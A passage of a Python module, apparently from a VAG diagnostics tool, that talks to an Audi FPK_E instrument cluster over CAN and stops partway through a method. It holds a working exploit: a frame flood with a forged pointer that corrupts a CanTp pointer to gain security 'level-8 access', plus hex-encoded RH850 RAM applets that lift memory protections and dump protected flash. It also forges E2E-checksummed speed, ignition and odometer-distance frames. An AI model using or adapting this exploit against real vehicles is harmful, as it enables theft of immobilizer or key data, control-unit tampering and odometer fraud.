"""Audi / VAG FPK_E (SW 83A, 83A920700E) live CAN transport, level-8 access, RSCAN0 streaming & UDS 0x23 reader."""

from __future__ import annotations

import base64
from collections.abc import Iterator
import contextlib
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import struct
import tempfile
import threading
import time
from typing import Any
import zlib

import can

from contitool.can.hw_applets import _Rh850Builder, _emit_bfaselr_switch_subroutine
from contitool.can.transport import (
    BLOCK_SEND_TIMEOUT,
    FRAME_SEND_TIMEOUT,
    P2_STAR_WAIT,
    UdsNegativeResponse,
    UnexpectedUdsResponse,
    _acquire_win_timer,
    _checked_response,
    _release_win_timer,
    _tune_slcan_bus,
)
from contitool.core.fpke import (
    FPKE_BFLASH_ADDR,
    FPKE_BFLASH_SIZE,
    FPKE_CFLASH_ADDR,
    FPKE_CFLASH_CONTROL_PREFIX,
    FPKE_CFLASH_SIZE,
    FPKE_DFLASH_ADDR,
    FPKE_DFLASH_SIZE,
    FPKE_EXTRA_ADDR,
    FPKE_EXTRA_SIZE,
    FPKE_UFLASH_ADDR,
    FPKE_UFLASH_SIZE,
    aes128_cbc_encrypt,
    analyze_fpke_dflash,
    analyze_fpke_extra_area,
    build_fd11_proof,
    is_fpke_dflash,
    validate_fpke_extra_area,
)
from contitool.i18n import tr
from contitool.progress import NULL_REPORTER, OperationReporter

# ────────────────────────────── CAN Identifiers & Constants ──────────────────────────────

FPKE_UDS_TX_ID = 0x714
FPKE_UDS_RX_ID = 0x77E
FPKE_STREAM_RX_ID = 0x6F1

FPKE_ARM_ID = 0x1BFCA2EC
FPKE_BLOCK_ID = 0x1BFCA2ED
FPKE_ARM_RESPONSE_ID = 0x1BFCA2EE
FPKE_CF_CH9_ID = 0x17FA0E14

FPKE_NATIVE_INTERFACES: tuple[str, ...] = ("slcan", "gs_usb", "socketcan", "pcan", "kvaser", "vector")

# SW 83A (83A920700E, SW 6181) block-stream & CanTp channel-9 addresses
FPKE_BLOCK_BUFFER = 0xFEDE7820
FPKE_CANTP_CH9_PTR = 0xFEDE97F8
FPKE_LEVEL_ADDRESS = 0xFEDF3113
FPKE_FORGED_PTR = FPKE_LEVEL_ADDRESS - 6  # 0xFEDF310D
FPKE_POINTER_FRAME = (FPKE_CANTP_CH9_PTR - FPKE_BLOCK_BUFFER) // 8  # 1019
FPKE_REQUIRED_LEVEL = 8
FPKE_DEFAULT_FRAME_DELAY = 0.00035  # 0.35 ms per frame (1022 frames in ~0.358 s)

# SW 83A MPU SX RAM applet & RH850 peripheral addresses
FPKE_APPLET_ENTRY = 0xFEDF1800
FPKE_SOURCE_PARAM = 0xFEDF1900
FPKE_RESULT_ADDR = 0xFEDF1A00
FPKE_RESULT_SIZE = 260
FPKE_MARKER_ADDR = 0xFEDF1B00
FPKE_SAVED_MPUA3_ADDR = 0xFEDF1B10
FPKE_SAVED_RETURN = 0xFEDC3B78
FPKE_CALLER_RETURN = 0x0009CF0E
FPKE_CALLER_R29 = 0xFEDF31C8

BFASELR_ADDR = 0xFFC59008
IDAUTH_ADDR = 0xFFA08000
IDST_ADDR = 0xFFA08010
RSCAN0_BASE = 0xFFD00000
WDTA1_BASE = 0xFFED1000

FPKE_STREAM_CHUNK_BYTES = 2048  # 256 x 8-byte CAN frames (~64 ms burst on 0x6F1)

# Keepalive frames (2 ms apart, ~200 ms cycle; 0x3C0 KL_S+KL15=0x03, 0x663 group 5 master for MFL 0x5BF)
FPKE_KEEPALIVE_PATTERN: tuple[tuple[int, bytes], ...] = (
    (0x3C0, bytes.fromhex("00000300")),
    (0x663, bytes.fromhex("0000000e00000000")),
    (0x585, bytes.fromhex("0000000000")),
    (0x3BE, bytes.fromhex("0000000000000000")),
)

# CRC8H2F (polynomial 0x2F, ROM 0x1919C4) & E2E Data IDs from ac-can-matrix.md / can_drive_plan.py
_CRC8H2F: tuple[int, ...] = tuple(
    (
        lambda c: [c := (((c << 1) ^ 0x2F) & 0xFF if (c & 0x80) else ((c << 1) & 0xFF)) for _ in range(8)][-1]
    )(i)
    for i in range(256)
)

FPKE_E2E_DATA_ID: dict[int, tuple[int, ...]] = {
    0x31B: (0x67, 0x8A, 0xAE, 0x22, 0x4D, 0xD0, 0x51, 0x80, 0x5C, 0xB9, 0xCE, 0x1E, 0xDF, 0x02, 0x2D, 0xD4),
    0x040: (0x40,) * 16,
    0x0FD: (0xB4, 0xEF, 0xF8, 0x49, 0x1E, 0xE5, 0xC2, 0xC0, 0x97, 0x19, 0x3C, 0xC9, 0xF1, 0x98, 0xD6, 0x61),
    0x3BE: (0x1F, 0x28, 0xC6, 0x85, 0xE6, 0xF8, 0xB0, 0x19, 0x5B, 0x64, 0x35, 0x21, 0xE4, 0xF7, 0x9C, 0x24),
    0x3C0: (0xC3,) * 16,
    0x65D: (0xAC, 0xB3, 0xAB, 0xEB, 0x7A, 0xE1, 0x3B, 0xF7, 0x73, 0xBA, 0x7C, 0x9E, 0x06, 0x5F, 0x02, 0xD9),
}


def fpke_e2e_crc(can_id: int, data: bytes | bytearray) -> int:
    """Compute VW MQB E2E profile 2 CRC8H2F over `data[1:]` and `FPKE_E2E_DATA_ID[can_id][counter]`."""
    c = 0xFF
    for b in data[1:]:
        c = _CRC8H2F[c ^ b]
    return _CRC8H2F[c ^ FPKE_E2E_DATA_ID[can_id][data[1] & 0x0F]] ^ 0xFF


def build_fpke_drive_frame(
    can_id: int,
    counter: int,
    *,
    speed_kmh: float = 0.0,
    rpm: float = 0.0,
    temp_c: float = 90.0,
    distance_m: float = 0.0,
    kl15: bool = True,
    circ_mm: int = 2000,
    teeth: int = 43,
) -> bytes:
    """Build one verified MQB bench frame for FPK_E (`0x3C0`, `0x31B`, `0x0FD`, `0x65D`, `0x107`, `0x3BE`, `0x640`, `0x647`, `0x040`)."""
    d = bytearray(4 if can_id == 0x3C0 else 8)
    if can_id == 0x3C0:
        d[2] = 0x03 if kl15 else 0x00
    elif can_id == 0x31B:
        raw_spd = max(0, min(0x7F7F, round(speed_kmh * 128.0 * 1085.0 / circ_mm)))
        d[2] = (raw_spd & 0x7F) << 1
        d[3] = (raw_spd >> 7) & 0xFF
        pulses = int(distance_m * 1000.0 / circ_mm * teeth * 2) & 0x7FF
        d[5] = pulses & 0xFF
        d[6] = (pulses >> 8) & 0x07
    elif can_id == 0x0FD:
        raw_v = max(0, min(0xFFFF, round(speed_kmh / 0.01)))
        d[4] = raw_v & 0xFF
        d[5] = (raw_v >> 8) & 0xFF
    elif can_id == 0x65D:
        d[2] = teeth & 0xFF
    elif can_id == 0x107:
        raw_rpm = max(0, min(0x0FFF, round(rpm / 3.0)))
        d[3] = raw_rpm & 0xFF
        d[4] = (raw_rpm >> 8) & 0x0F
    elif can_id == 0x3BE:
        d[4] = 0x80 if rpm > 0 else 0x00
    elif can_id == 0x640:
        d[2] = max(0, min(0xFF, round(temp_c + 60.0)))
        d[3] = max(0, min(0xFF, round((temp_c + 48.0) / 0.75)))
    elif can_id == 0x647:
        d[0] = max(0, min(0xFF, round((temp_c + 48.0) / 0.75)))
    if can_id in FPKE_E2E_DATA_ID:
        d[1] = (d[1] & 0xF0) | (counter & 0x0F)
        d[0] = fpke_e2e_crc(can_id, d)
    return bytes(d)


# Steering-wheel MFL buttons (0x5BF MFL_Tasten_Kon_01, requires 0x663 group-5 master; ac-mfl-buttons.md)
FPKE_MFL_BUTTONS: tuple[tuple[str, int, int, str, str], ...] = (
    ("ok", 0x07, 0x01, "OK", "OK"),
    ("menu", 0x02, 0x01, "Меню", "Menu"),
    ("up", 0x06, 0x0F, "Вверх ▲", "Up ▲"),
    ("down", 0x06, 0x01, "Вниз ▼", "Down ▼"),
    ("back", 0x01, 0x01, "Назад", "Back"),
    ("assist", 0x04, 0x01, "Ассистенты", "Assistants"),
)

# Prepared CAN frames for the cluster CAN control panel
FPKE_CAN_PRESETS: tuple[tuple[str, int, bool, str, str, str], ...] = (
    ("kl15_on", 0x3C0, False, "00 00 03 00", "Зажигание — включить (0x3C0)", "Ignition — ON (0x3C0)"),
    ("kl15_off", 0x3C0, False, "00 00 00 00", "Зажигание — выключить (0x3C0)", "Ignition — OFF (0x3C0)"),
    ("mfl_master", 0x663, False, "00 00 00 0E 00 00 00 00", "Разрешение кнопок руля (0x663)", "Enable steering buttons (0x663)"),
    ("mfl_ok", 0x5BF, False, "07 00 01 00", "Руль — кнопка OK (0x5BF)", "Steering — OK press (0x5BF)"),
    ("mfl_menu", 0x5BF, False, "02 00 01 00", "Руль — кнопка Меню (0x5BF)", "Steering — Menu press (0x5BF)"),
    ("mfl_release", 0x5BF, False, "00 00 00 00", "Руль — отпускание кнопки (0x5BF)", "Steering — button release (0x5BF)"),
    ("rpm_idle", 0x107, False, "00 00 00 0B 01 00 00 00", "Тахометр — 800 об/мин (0x107)", "Tachometer — 800 RPM (0x107)"),
    ("rpm_3000", 0x107, False, "00 00 00 E8 03 00 00 00", "Тахометр — 3000 об/мин (0x107)", "Tachometer — 3000 RPM (0x107)"),
    ("temp_90", 0x640, False, "00 00 96 B8 00 00 00 00", "Температура ОЖ — 90 °C (0x640)", "Coolant temp — 90 °C (0x640)"),
    ("ec_reset", 0x1BFCA2EC, True, "06 00 00 00 00 00 00 00", "Сброс графического канала (0x1BFCA2EC)", "Reset display channel (0x1BFCA2EC)"),
)

FPKE_ARM_FRAMES: tuple[bytes, ...] = (
    bytes.fromhex("011104000000ffff"),
    bytes.fromhex("020000000000ffff"),
    bytes.fromhex("0301000100ffffff"),
)

# 8192-byte (1024 x 8B) CAN-descriptor-preserving block-stream template for SW 83A
FPKE_TEMPLATE_SHA256 = "c07cd47319d590880654b43f0bc82596225c4086fbfdb1474206a09f4ce2efd6"
FPKE_TEMPLATE_B85 = (
    "c-rllOKclO9L8tkXVVZnBBbGwCJi+XA<#g>yU^kmC{T(62^44`K!5-NLMad+b_@-\n"
    "Wq8<<+R3s!g^iUxV91!AwL=KhcfkT8ia0oaDRDo2f5kknQ=?=3m`<u@;d8k+sWLEZmJHMU({%3b~zTFjKrL2^d^8YPWVr})YP+X~\n"
    "|@Uf6E47=7arb5=*@9yPoyKBR1ZMCs}c7@+<tgx&W;!LGh`-\n"
    "BLq^?}i!&1g%NrR#kOXRr2v!wxIv#q%ee;N31eVzE{yi$KE4R*2sN&U!{MuVGLzbtthl=(L+ttg|y}vrxk6$4-\n"
    "|urV7UkD;9t}yA+GAFXUMVc_veOo)O4pD5d984Q#?@{yeLN{vAr`{R=}MCR2JJ&VW3ptvovld9H^3<*0u_=tF&4??VW3=}han)Bx\n"
    "K-Y!&1(nAUTNLf^;JR^J_F^}QZO-\n"
    "Y1ZYRn7waHL(WJKN4F5`VV4_prd0tI~#Ndv2#FgCw4CA0b=KY&Jb$?{SmRXpuZy44EhIREud$Ktpi<?(OE0#He%<4-\n"
    "bQRa=zd}`(4)jI0DX{H9P}5&+CWbcyAbqoV(p;Auj%X}><_UH&|8RI40<=QOF)kh+W`7~Vx6ErCw3|5?}%Ln`d4BbLHl3VSr?8SV\n"
    "wZ#7MC=OCyNF#0dM~l7K)*xmYS5n%y9V@8V%LKHh1e$C*r&7W@IEDWJ?2boGw2>-TR;yJy8-\n"
    "k8VhPZPiERaagxEIFGsJELJxA;&oD;`&b~BC-\n"
    "V%tF{iQNKvh}f;5Cy3n!`Vg@lpeKpl4tko{PS81GcYv;cLuX067m0OaUc~MMJxJ^>(Bs5<(Eo__qW=-\n"
    "Q8~u;iJ?MYLcA@{hsk3`=-XnG&jsar#qyG`xjs8ch5B-nW1L%Lm9z_2m){p*2>>>2Ow{-\n"
    "R}dJM5g@O~pUfX62GDEc3<$I$<XJ&yiIY!LmA*c0e~#GXX|o6y-)=zqk9aBd^^G+t+7&!GPidlvnV*f9DZvFFhLi0wiDBlbM{-\n"
    "+rC#MgJrA0{RHC7xA7V_7cV?HiG^~>}B*nVy~e85qlN=kJu<~ysfho`X8}0`X4cg^A|CrRH^9utIy}9;=Ptu8MX{8DV!gCM4Bh%s\n"
    "c**?(>xQgS7z}!@cnbcnQ!Dm;!kRAnoad?kg?}JFZ`?(##DcD>{KLoLYgPa$DP%W*=@JXxDOC!;X2EcS!qgXhH_acv)INg6?R|=r\n"
    "@f}Ju6e$FdKVb0owolRo|E<v?;o?@NekJ_NZ3)eWrHPq#e43+`q)0bA@SktW*#bwDu%i?C7x?qzAW*)>0W29F@>3xVwslYZ=Y73{\n"
    ";1iX>h^_3GNGfQ&yC*qeN2B3ma^zHiONkzwWlLUs|YWf>nP_fiw<d4CUc{b*Zp5F-\n"
    "gnc&AaQ0M@7rMhIZyQ1y`E@jazCm}$!0TSzT1}jOYSKX9E`ukIYLHFa!Z?Al6CM^xqLY|f23h|uw<P1a6|DxN~iU6l(%owEIaTFZ\n"
    "4pKPsDxHqp!or&?IB9;XV9R;{gvv{B5o8#5sVTw0-_sQuA=B@%>P68L?z~smBm{8+OkU7oV7UhhT8U?g8cK8p!+L@g3d3$-\n"
    "C&iVs&k8u%a?d87FR|6$AYoAKNee-BP&uJi9{CpmbB)B=>>b|@kn;T`~D5}DM6<\n"
)
FPKE_TEMPLATE = zlib.decompress(base64.b85decode("".join(FPKE_TEMPLATE_B85.split())))

# Hardware-verified 256-byte RAM-buffer reader applets (PSW ID|NP save/restore)
FPKE_BFLASH_BUF_PAYLOAD_SHA256 = "310e3e70aede2e2ca80368f55cb8c7087d9ac611843e205dff87b360a701b2fb"
FPKE_BFLASH_BUF_PAYLOAD = (
    bytes.fromhex(
        "f5a7400020b6a00015b1f6a72000013280ff700080ff7e0034060019dffe3447"
        "01002906001adffe20364000283f0100693f01004442444a5f329afd003280ff"
        "420080ff500027065343414e2906001bdffe693f01003d06c831dffe3f060ecf"
        "09000052f5a720007f00"
    ).ljust(0x80, b"\x00")
    + bytes.fromhex(
        "2a060890c5ff4a3700000a5700001c007f00f86740208c660001ecc72020f8674020"
        "cc6600016062bafd1c00e6674008cc66e00020762000ec71a20df86740688c660200"
        "ecc72068f8674068e50d2c060007bcff01724c0700004c7700004c0700000c770000"
        "1c007f00"
    )
)

FPKE_UFLASH_BUF_PAYLOAD_SHA256 = "fe17a12b1e50fafd8f9cf3045f926786bc2b5415643ddc4a01419f241af96338"
FPKE_UFLASH_BUF_PAYLOAD = bytes.fromhex(
    "f5a7400020b6a00015b1f6a72000e76f20302906101bdffe693f01002706ff7f"
    "0001e76f40301c001f0034060019dffe344701002906001adffe20364000283f"
    "0100693f01004442444a5f329afd2906101bdffe293f0100e76f40301c001f00"
    "27065343414e2906001bdffe693f01003d06c831dffe3f060ecf09000052f5a7"
    "20007f00"
)


def build_fpke_can_stream_applet(mode: str = "direct") -> bytes:
    """Build RH850 SX RAM applet (`0xFEDF1800`) that streams memory in 8-byte CAN frames on `0x6F1` via `RSCAN0` `TM17`.

    Parameters at `0xFEDF1900`:
      - `+0x00` (`u32` LE): `source_addr`
      - `+0x04` (`u32` LE): `frame_count` (number of 8-byte frames to transmit on `0x6F1`, e.g. 256 = 2 KiB)
    Modes:
      - `'direct'`: normal mapping (CodeFlash `0x00000000`, DataFlash `0xFF200000`, RAM)
      - `'bflash'`: switches `BFASELR = 1` before streaming and restores `BFASELR = 0` + I-cache/CFCNT afterwards
      - `'uflash'`: saves `MPUA3`, expands `MPUA3 = 0x01007FFF` before streaming, and restores `MPUA3` afterwards
    Services `WDTA1` (`0xFFED1004 = 0xAC - [0xFFED1008]`) every frame and returns cleanly to `0x0009CF0E` (`7D` on `0x77E`).
    """
    if mode not in ("direct", "bflash", "uflash"):
        raise ValueError(f"Unsupported stream applet mode: {mode}")

    b = _Rh850Builder()
    # 1. Save PSW into r21 and set PSW.ID | PSW.NP (0xA0)
    b._emit(bytes.fromhex("f5a7400020b6a00015b1f6a72000"))

    if mode == "bflash":
        b.mov_imm5(1, 6)
        b.jarl("SUB_SWITCH_BFLASH")
    elif mode == "uflash":
        # Save MPUA3 to 0xFEDF1B10 and expand MPUA3 to 0x01007FFF
        b._emit(bytes.fromhex("e76f20302906101bdffe693f01002706ff7f0001e76f40301c001f00"))

    # 2. Load source_addr (r8) and frame_count (r9) from 0xFEDF1900
    b.mov_imm(FPKE_SOURCE_PARAM, 20)
    b.ld_w(0, 20, 8)
    b.ld_w(4, 20, 9)

    # 3. Configure RSCAN0 Channel 1 TX buffer 1 (TM17, p = 17: TMIE17 == 0)
    b.movhi(0xFFD0, 0, 20)  # r20 = 0xFFD00000
    b.st_b(0, 0x02E1, 20)   # TMSTS17 = 0 (clear TMTRF)
    b.mov_u16(FPKE_STREAM_RX_ID, 6)
    b.st_w(6, 0x1110, 20)   # TMID17 = 0x6F1 (11-bit standard frame)
    b.movhi(0x8000, 0, 6)   # r6 = 0x80000000 (DLC = 8)
    b.st_w(6, 0x1114, 20)   # TMPTR17 = DLC 8

    # 4. Stream loop: kick WDTA1, write TMDF0/1_17, set TMC17.TMTR=1, wait TMSTS17 & 6 != 0, clear TMSTS17
    b.movhi(0xFFED, 0, 11)  # r11 = 0xFFED0000 (WDTA1 at +0x1000)
    b.mov_u16(0x00AC, 13)   # r13 = 0xAC

    b.label("FRAME_LOOP")
    # Kick WDTA1 (VAC mode: WDTA1EVAC = 0xAC - WDTA1REF)
    b.ld_bu(0x1008, 11, 12)
    b.subr(13, 12)
    b.st_b(12, 0x1004, 11)

    b.ld_w(0, 8, 6)
    b.ld_w(4, 8, 7)
    b.st_w(6, 0x1118, 20)   # TMDF0_17
    b.st_w(7, 0x111C, 20)   # TMDF1_17
    b.mov_imm5(1, 6)
    b.st_b(6, 0x0261, 20)   # TMC17 = 1 (TMTR)

    b.movhi(0x0004, 0, 6)   # timeout counter r6 = 0x40000
    b.label("WAIT_TX")
    b.ld_bu(0x02E1, 20, 7)  # TMSTS17
    b.andi(0x0006, 7, 7)    # TMTRF bits 2:1
    b.bne_short("TX_DONE")
    b.add_imm5(-1, 6)
    b.bne_short("WAIT_TX")
    b.br_short("STREAM_END")

    b.label("TX_DONE")
    b.st_b(0, 0x02E1, 20)   # clear TMSTS17 (TMTRF := 00)
    b.add_imm5(8, 8)
    b.add_imm5(-1, 9)
    b.bne_short("FRAME_LOOP")

    b.label("STREAM_END")
    b.st_b(0, 0x02E1, 20)
    if mode == "bflash":
        b.mov_imm5(0, 6)
        b.jarl("SUB_SWITCH_BFLASH")
    elif mode == "uflash":
        b._emit(bytes.fromhex("2906101bdffe293f0100e76f40301c001f00"))

    # Write "SCAN" marker to 0xFEDF1B00 and return to 0x0009CF0E with r29=0xFEDF31C8, r10=0, PSW=r21
    b.mov_imm(0x4E414353, 7)
    b.mov_imm(FPKE_MARKER_ADDR, 9)
    b.st_w(7, 0, 9)
    b._emit(bytes.fromhex("3d06c831dffe3f060ecf09000052f5a720007f00"))

    if mode == "bflash":
        _emit_bfaselr_switch_subroutine(b, "SUB_SWITCH_BFLASH")

    payload = b.build()
    if len(payload) > 0x100:
        raise RuntimeError(f"FPK_E stream applet ({mode}) size {len(payload)} exceeds 256-byte 0xFEDF1800 slot")
    return payload


def flood_payload(index: int) -> bytes:
    """Return 8-byte payload for block-stream frame `index` (0..1023), patching frame 1019 with `FORGED_PTR`."""
    data = bytearray(FPKE_TEMPLATE[index * 8 : index * 8 + 8])
    if len(data) != 8:
        raise ValueError(f"Invalid flood frame index: {index}")
    if index == FPKE_POINTER_FRAME:
        data[:4] = FPKE_FORGED_PTR.to_bytes(4, "little")
    return bytes(data)


def partition_chunks(size: int, chunk: int) -> list[int]:
    """Split `size` into `chunk`-sized pieces (plus any remainder)."""
    if size <= 0 or chunk <= 0:
        raise ValueError(f"Invalid partition({size}, {chunk})")
    return [min(chunk, size - offset) for offset in range(0, size, chunk)]


def verify_fpke_self_tests() -> None:
    """Deterministic offline consistency checks for FPK_E template, pointers, applets, and AES-128-CBC."""
    if len(FPKE_TEMPLATE) != 0x2000:
        raise RuntimeError(f"FPK_E template length mismatch: {len(FPKE_TEMPLATE)} != 8192")
    if hashlib.sha256(FPKE_TEMPLATE).hexdigest() != FPKE_TEMPLATE_SHA256:
        raise RuntimeError("FPK_E template SHA-256 mismatch")
    if FPKE_POINTER_FRAME != 1019 or FPKE_BLOCK_BUFFER + 8 * FPKE_POINTER_FRAME != FPKE_CANTP_CH9_PTR:
        raise RuntimeError("FPK_E CanTp channel-9 pointer frame calculation mismatch")
    if flood_payload(FPKE_POINTER_FRAME) != bytes.fromhex("0d31dffe00000000"):
        raise RuntimeError("FPK_E frame 1019 forged pointer bytes mismatch")
    if len(FPKE_BFLASH_BUF_PAYLOAD) != 234 or hashlib.sha256(FPKE_BFLASH_BUF_PAYLOAD).hexdigest() != FPKE_BFLASH_BUF_PAYLOAD_SHA256:
        raise RuntimeError("FPK_E BFlash buffer applet SHA-256 mismatch")
    if len(FPKE_UFLASH_BUF_PAYLOAD) != 132 or hashlib.sha256(FPKE_UFLASH_BUF_PAYLOAD).hexdigest() != FPKE_UFLASH_BUF_PAYLOAD_SHA256:
        raise RuntimeError("FPK_E UFlash buffer applet SHA-256 mismatch")
    for mode in ("direct", "bflash", "uflash"):
        stream_app = build_fpke_can_stream_applet(mode)
        if not (64 <= len(stream_app) <= 256):
            raise RuntimeError(f"Invalid stream applet size for {mode}: {len(stream_app)}")
    chunks = partition_chunks(FPKE_DFLASH_SIZE, 500)
    if len(chunks) != 132 or sum(chunks) != FPKE_DFLASH_SIZE or chunks[-1] != 36:
        raise RuntimeError("FPK_E DFlash partition check failed")
    # NIST SP 800-38A AES-128-CBC vector
    key = bytes.fromhex("2b7e151628aed2a6abf7158809cf4f3c")
    iv = bytes.fromhex("000102030405060708090a0b0c0d0e0f")
    plain = bytes.fromhex("6bc1bee22e409f96e93d7e117393172aae2d8a571e03ac9c9eb76fac45af8e51")
    expected = bytes.fromhex("7649abac8119b246cee98e9b12e9197d5086cb9b507219ee95db113a917678b2")
    if aes128_cbc_encrypt(key, iv, plain) != expected:
        raise RuntimeError("FPK_E AES-128-CBC self-test failed")


def atomic_write(path: Path, data: bytes) -> None:
    """Atomically write `data` to `path` via a sibling temporary file."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp_path: Path | None = None
    try:
        with tempfile.NamedTemporaryFile(dir=path.parent, prefix=path.name + ".", delete=False) as fh:
            tmp_path = Path(fh.name)
            fh.write(data)
        tmp_path.replace(path)
    finally:
        if tmp_path is not None and tmp_path.exists():
            with contextlib.suppress(OSError):
                tmp_path.unlink()


# ────────────────────────────── FPK_E CAN Transport Link ──────────────────────────────


class FpkeCanLink:
    """High-throughput CAN link for VAG FPK_E (11-bit UDS `0x714/0x77E`, 29-bit Continental `0x1BFCA2xx`, raw `0x6F1`).

    Uses the same tuned `python-can` + `_tune_slcan_bus` (256 KB RX buffer, bulk `in_waiting` reads, 1 ms Win32 timer,
    and ISO-TP `FlowControl` handling) as `J533CanLink`. Only native CAN interfaces (`slcan`, `gs_usb`, etc.) are
    permitted; D-PDU / J2534 wrappers are explicitly rejected.
    """

    UDS_TX_ID = FPKE_UDS_TX_ID
    UDS_RX_ID = FPKE_UDS_RX_ID
    STREAM_RX_ID = FPKE_STREAM_RX_ID

    def __init__(
        self,
        port: str,
        *,
        interface: str = "slcan",
        bitrate: int = 500_000,
        tty_baudrate: int = 115_200,
        log_path: Path | None = None,
        bus: Any | None = None,
    ) -> None:
        if bus is None and interface not in FPKE_NATIVE_INTERFACES:
            raise RuntimeError(
                tr(
                    f"Работа с приборной панелью FPK поддерживается только через нативный CAN-адаптер "
                    f"(CANable / SLCAN / candleLight). Интерфейс «{interface}» (VNCI / D-PDU / J2534) для FPK не поддерживается.",
                    f"FPK instrument cluster operations require a native CAN adapter (CANable / SLCAN / candleLight). "
                    f"Interface “{interface}” (VNCI / D-PDU / J2534) is not supported for FPK.",
                )
            )
        self.port = port
        self.interface = interface
        self.is_closed = False
        self.level8_active = False
        self.tx_frames = 0
        self.rx_frames = 0
        self._t0 = time.monotonic()
        self._tx_lock = threading.Lock()
        self._history_lock = threading.Lock()
        self._history: list[tuple[float, str, int, bool, bytes]] = []
        self._rx_trace_suspended = 0
        self._log_file = None
        self._keepalive_stop: threading.Event | None = None
        self._keepalive_thread: threading.Thread | None = None
        self._keepalive_started_at: float | None = None
        self._drive_stop: threading.Event | None = None
        self._drive_thread: threading.Thread | None = None
        self.sim_speed_kmh: float = 0.0
        self.sim_rpm: float = 800.0
        self.sim_temp_c: float = 90.0
        self.sim_auto_sweep: bool = True

        self.attach_log(log_path)

        if bus is not None:
            self.bus = bus
            self._owns_bus = False
        else:
            kwargs: dict[str, Any] = {
                "interface": interface,
                "channel": port,
                "bitrate": bitrate,
                "timeout": 0.1,
            }
            if interface == "slcan":
                kwargs["tty_baudrate"] = tty_baudrate
            self.bus = can.interface.Bus(**kwargs)
            if interface == "slcan":
                _tune_slcan_bus(self.bus)
            self._owns_bus = True
        self._timer_held = _acquire_win_timer()

    def attach_log(self, log_path: Path | None) -> None:
        if self._log_file is not None:
            with contextlib.suppress(Exception):
                self._log_file.close()
            self._log_file = None
        if log_path is not None:
            log_path.parent.mkdir(parents=True, exist_ok=True)
            self._log_file = log_path.open("a", encoding="utf-8", buffering=1)

    def close(self) -> None:
        self.is_closed = True
        self.level8_active = False
        self.stop_drive_simulation()
        self.stop_keepalive()
        if getattr(self, "_timer_held", False):
            _release_win_timer()
            self._timer_held = False
        if getattr(self, "_owns_bus", False) and getattr(self, "bus", None) is not None:
            with contextlib.suppress(Exception):
                self.bus.shutdown()
            self._owns_bus = False
        if self._log_file is not None:
            with contextlib.suppress(Exception):
                self._log_file.close()
            self._log_file = None

    def __enter__(self) -> FpkeCanLink:
        return self

    def __exit__(self, exc_type: Any, exc: Any, tb: Any) -> None:
        self.close()

    def _record_frame(self, direction: str, arb_id: int, extended: bool, data: bytes) -> None:
        rel_t = time.monotonic() - self._t0
        if not (direction == "rx" and self._rx_trace_suspended):
            with self._history_lock:
                self._history.append((rel_t, direction, arb_id, extended, data))
            if self._log_file is not None:
                self._log_file.write(
                    json.dumps(
                        {
                            "time": time.time(),
                            "direction": direction,
                            "id": f"0x{arb_id:08X}" if extended else f"0x{arb_id:03X}",
                            "extended": extended,
                            "dlc": len(data),
                            "data": data.hex(),
                        }
                    )
                    + "\n"
                )

    @contextlib.contextmanager
    def suspend_rx_trace(self) -> Iterator[None]:
        self._rx_trace_suspended += 1
        try:
            yield
        finally:
            self._rx_trace_suspended -= 1

    def write_stream_summary(self, address: int, expected: int, received: int, frames: int) -> None:
        if self._log_file is not None:
            self._log_file.write(
                json.dumps(
                    {
                        "time": time.time(),
                        "direction": "rx_stream",
                        "id": f"0x{self.STREAM_RX_ID:03X}",
                        "address": f"0x{address:08X}",
                        "expected_bytes": expected,
                        "received_bytes": received,
                        "frames": frames,
                    }
                )
                + "\n"
            )

    def save_can_log(self, path: Path) -> None:
        """Save TX/RX frame history in the `audi-83a-keyless-can-access.md` `.can.log` text format."""
        with self._history_lock:
            history = list(self._history)
        lines = [
            f"{ts:.6f} {direction} {can_id:08X} {int(extended)} {len(data)} {data.hex()}"
            for ts, direction, can_id, extended, data in history
        ]
        atomic_write(path, ("\n".join(lines) + ("\n" if lines else "")).encode("utf-8"))

    # ── Keepalive background thread (0x3C0, 0x663, 0x585, 0x3BE) & bench controls ──

    def is_keepalive_running(self) -> bool:
        return self._keepalive_thread is not None and self._keepalive_thread.is_alive()

    def start_keepalive(self) -> None:
        if self.is_keepalive_running():
            return
        stop = threading.Event()
        self._keepalive_stop = stop
        if self._keepalive_started_at is None:
            self._keepalive_started_at = time.monotonic()

        def _loop() -> None:
            while not stop.is_set():
                for can_id, payload in FPKE_KEEPALIVE_PATTERN:
                    if stop.is_set():
                        break
                    if self.is_drive_simulation_running() and can_id in (0x3C0, 0x3BE):
                        continue
                    with contextlib.suppress(Exception):
                        self.send_frame(can_id, payload, extended=False)
                    if stop.wait(0.002):
                        break
                stop.wait(0.19)

        t = threading.Thread(target=_loop, name="fpke-keepalive", daemon=True)
        self._keepalive_thread = t
        t.start()

    def stop_keepalive(self) -> None:
        if self._keepalive_stop is not None:
            self._keepalive_stop.set()
        if self._keepalive_thread is not None:
            self._keepalive_thread.join(timeout=1.0)
        self._keepalive_stop = None
        self._keepalive_thread = None
        self._keepalive_started_at = None

    def set_kl15(self, enabled: bool) -> None:
        """Enable or disable periodic KL15 ignition broadcast (`0x3C0` + `0x663` + `0x585` + `0x3BE`)."""
        if enabled:
            self.start_keepalive()
            with contextlib.suppress(Exception):
                self.send_frame(0x3C0, bytes.fromhex("00000300"), extended=False)
                self.send_frame(0x663, bytes.fromhex("0000000e00000000"), extended=False)
        else:
            self.stop_drive_simulation()
            self.stop_keepalive()
            for _ in range(3):
                with contextlib.suppress(Exception):
                    self.send_frame(0x3C0, bytes.fromhex("00000000"), extended=False)
                time.sleep(0.02)

    def send_mfl_button(self, code: int, event: int = 1, hold_s: float = 0.2) -> None:
        """Send a steering-wheel button press on `0x5BF` (`MFL_Tasten_Kon_01`) with `0x663` group-5 master supervision."""
        self.send_frame(0x663, bytes.fromhex("0000000e00000000"), extended=False)
        self.send_frame(0x5BF, bytes([code & 0xFF, 0x00, event & 0xFF, 0x00]), extended=False)
        if hold_s > 0:
            time.sleep(hold_s)
        self.send_frame(0x5BF, b"\x00\x00\x00\x00", extended=False)

    def is_drive_simulation_running(self) -> bool:
        return self._drive_thread is not None and self._drive_thread.is_alive()

    def set_drive_targets(
        self,
        *,
        speed_kmh: float | None = None,
        rpm: float | None = None,
        temp_c: float | None = None,
        auto_sweep: bool | None = None,
    ) -> None:
        if speed_kmh is not None:
            self.sim_speed_kmh = max(0.0, min(260.0, float(speed_kmh)))
        if rpm is not None:
            self.sim_rpm = max(0.0, min(7000.0, float(rpm)))
        if temp_c is not None:
